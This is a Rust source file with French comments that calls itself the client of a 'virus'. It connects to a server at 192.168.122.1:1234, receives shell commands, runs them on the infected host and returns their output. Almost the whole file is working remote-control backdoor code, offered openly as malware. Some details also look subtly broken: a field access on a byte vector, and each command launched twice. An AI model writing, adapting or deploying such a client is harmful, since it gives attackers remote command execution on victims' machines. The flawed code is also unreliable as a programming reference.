//! Ce fichier contient le code source du client CàD le virus lui-même, qui recevras des commandes que l'on lui envoie afin de les executer sur l'hote distant
//!
//! Son fonctionnement se résume de la manière suivante: Il se connecte au serveur, récupère les commandes envoyées, les execute sur la machine sur laquelle il se trouve, puis renvoie tout message d'execution de la commande.
//!Elle attendras par la suite un nouveau message.

use std::net::TcpStream;
use std::io::{Write, Read};
use std::process::Command;

///Cette fonction récupère le parametre command et l'execute.
///
///command est un string contenant la totalité du buffer reçu via la connection tcp.
///Cette fonctionne la sépare, l'execute puis renvois son résultat en vecteur de binaire.
pub fn execute_command(command: String) -> Vec<u8> {
    println!("message reçu : {}", command);
    //On le sépare par espace
    let vec_buf : Vec<&str> = command.split(' ').collect();
    //Puis on créé une fonction contenant le premier mot de notre commande
    let mut command_exec = Command::new(vec_buf[0]);

    //Avant de rajouter les autres comme argument
    for i in vec_buf.iter().skip(1) {
        command_exec.arg(i);
    }
    
    command_exec.spawn().expect("process failed to execute");
    let command_res = command_exec.output().unwrap().stdout;
    let stdout = String::from_utf8(command_res.clone()).unwrap();
    println!("{}", stdout);
    println!("Commande finit");

    return command_res;
}

///Cette fonction reçois les messages envoyés par le serveur, et les envoie à [execute_command]
///
///La fonction attends un message, controle si la connection entre client et serveur et toujours disponible, si le buffer est vide, et clear le buffer une fois le message traité
///Il renvoie ensuite la réponse au serveur
pub fn receive_message(mut stream: TcpStream) {
let mut msg: Vec<u8> = Vec::new();
    loop {
        let buf = &mut [0; 10];

        match stream.read(buf) {
            Ok(response) => {
                if response < 1 {
                    println!("Serveur déconnecté");
                    return;
                }
                let mut x = 0;

                for c in buf {
                    if x >= response {
                        break;
                    }
                    x += 1;
                    if *c == '\n' as u8 {
                        let command = String::from_utf8(msg.clone()).unwrap();
                        let command_res = execute_command(command);
                        stream.write(&command_res.stdout);
                        msg.clear();
                    } else {
                        msg.push(*c);
                    }
                }
            }
            Err(_) => {
                println!("Serveur déconnecté");
                return;
            }
        }
    }
}

///Cette fonction établie la connection avec le serveur.
pub fn establish_connection() {
    println!("Tentative de connexion au serveur...");
    match TcpStream::connect("192.168.122.1:1234") {
        Ok(stream) => {
            println!("Connexion au serveur réussi !");
            receive_message(stream);
        }
        Err(e) => {
            println!("La connexion au serveur a échoué : {}", e);
        }
    }
}

fn main() {
    establish_connection();
}